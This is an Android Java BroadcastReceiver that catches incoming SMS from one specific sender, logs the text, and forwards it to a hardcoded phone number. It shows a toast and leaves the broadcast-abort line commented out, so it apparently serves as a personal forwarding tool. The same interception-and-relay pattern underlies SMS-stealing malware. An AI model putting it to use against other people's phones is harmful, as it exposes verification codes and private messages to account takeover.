package com.arthur.smsreceiver.broadcast;

import java.util.ArrayList;

import com.arthur.smsreceiver.service.SmsService;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Vibrator;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
    	Log.v("arthur", "SmsRecevier onReceive");
	    if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){  
			Object[] pdus = (Object[]) intent.getExtras().get("pdus");
			if (pdus != null && pdus.length > 0) {
				SmsMessage[] messages = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					byte[] pdu = (byte[]) pdus[i];
					messages[i] = SmsMessage.createFromPdu(pdu);
				}
				ArrayList<String> divideContents = new ArrayList<String>();
				boolean bIntercepted = false;
				SmsManager smsManager = SmsManager.getDefault();
				for (SmsMessage message : messages) {
					String content = message.getMessageBody();// 得到短信内容
					String sender = message.getOriginatingAddress();// 得到发信息的号码
					if (sender.equals("10655021962999")) {
						bIntercepted = true;
						//abortBroadcast();// 中止发送
						Log.e("arthur", "已拦截!");
						divideContents.addAll(smsManager.divideMessage(content)); 
						Log.v("arthur", content);
					}
				}
				if (bIntercepted) {
					((Vibrator)context.getSystemService(Service.VIBRATOR_SERVICE)).vibrate(1000);
				    smsManager.sendMultipartTextMessage("+8615053351628", null, divideContents, null, null);
					Toast.makeText(context, "send to +8615053351628", Toast.LENGTH_SHORT).show();
				}
			}
	    }
	}
}
